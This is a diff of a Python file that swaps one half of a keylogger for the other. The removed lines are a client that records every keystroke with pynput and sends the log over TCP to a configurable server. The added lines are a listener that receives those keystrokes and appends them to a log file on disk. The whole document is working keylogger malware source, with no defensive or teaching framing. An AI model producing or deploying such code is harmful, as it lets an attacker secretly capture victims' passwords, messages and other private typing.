@@ -1,56 +1,40 @@
 import socket
-import threading
-from pynput import keyboard
 
-# Server IP and port (replace with your server's IP)
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 9999
+# Server IP and port
+HOST = '127.0.0.1'
+PORT = 9999
 
-# Create a global variable to store the logged keys
-log = ""
+# Path to the log file
+log_file_path = "D:\keylog.txt"
 
-# Function to capture keystrokes
-def on_press(key):
-    global log
-    try:
-        log += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log += " "  # Handle spaces
-        elif key == key.enter:
-            log += "\n"  # Handle enter key
-        else:
-            log += f" {str(key)} "  # Handle special keys
+# Function to start the server and listen for connections
+def start_server():
+    # Create a TCP socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Function to send keystrokes to the server
-def send_log_to_server():
-    global log
+    # Bind the socket to the specified IP and port
+    server_socket.bind((HOST, PORT))
+
+    # Start listening for incoming connections
+    server_socket.listen(5)
+    print(f"Server listening on {HOST}:{PORT}...")
+
     while True:
-        if log:
-            try:
-                # Connect to the server
-                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                client_socket.connect((SERVER_IP, SERVER_PORT))
+        # Accept a client connection
+        client_socket, client_address = server_socket.accept()
+        print(f"Connection from {client_address}")
 
-                # Send the log data to the server
-                client_socket.sendall(log.encode())
-                log = ""  # Clear log after sending
+        # Receive the data (keystrokes) from the client
+        data = client_socket.recv(1024).decode()
+        print(f"Received keystrokes: {data}")
 
-                # Close the connection
-                client_socket.close()
-            except Exception as e:
-                print(f"Failed to send data: {e}")
+        # Write the received data to the log file
+        with open(log_file_path, 'a') as log_file:
+            log_file.write(data + '\n')
 
-# Function to start the keylogger and sender thread
-def start_keylogger():
-    # Start a thread to send logs to the server
-    sender_thread = threading.Thread(target=send_log_to_server)
-    sender_thread.daemon = True
-    sender_thread.start()
-
-    # Start listening for keyboard events
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+        # Close the connection
+        client_socket.close()
 
 if __name__ == "__main__":
-    start_keylogger()
+    start_server()
+
